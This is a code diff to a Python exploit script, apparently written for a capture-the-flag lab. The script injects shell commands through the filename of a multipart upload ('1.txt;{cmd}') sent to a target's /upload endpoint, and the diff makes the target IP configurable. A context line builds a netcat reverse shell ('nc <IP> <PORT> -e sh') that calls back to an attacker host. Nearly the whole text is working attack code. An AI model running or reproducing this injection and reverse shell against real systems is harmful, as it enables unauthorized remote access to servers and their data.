@@ -44,13 +44,13 @@ elif len(sys.argv) == 3:
 
 
 
-def sendCmd(cmd):
+def sendCmd(cmd, ip):
     s = requests.Session()
     #burpproxy={"http":"http://127.0.0.1:8080"}
     fakeData = "fakedata".encode("ascii")
     data = {"file":(f"1.txt;{cmd}", fakeData, 'text/text'), "my-form":"Upload !"}
     #r = s.post("http://10.10.189.217/upload", files=data, proxies=burpproxy)
-    r = s.post("http://10.10.189.217/upload", files=data, timeout=3)
+    r = s.post(f"http://{ip}/upload", files=data, timeout=3)
     return r
 
 def printResults(text):
@@ -96,7 +96,7 @@ while True:
         bash = "nc <IP> <PORT> -e sh".replace("<IP>", "0x"+ ipp).replace("<PORT>", ip.split(":")[1])
         cmd = bash
     try:
-        r = sendCmd(cmd)    
+        r = sendCmd(cmd, ip)    
         printResults(r.text)
     except requests.Timeout as t:
         print(f"Error: Connection Timed out, Check you values!!\n\n{t}")
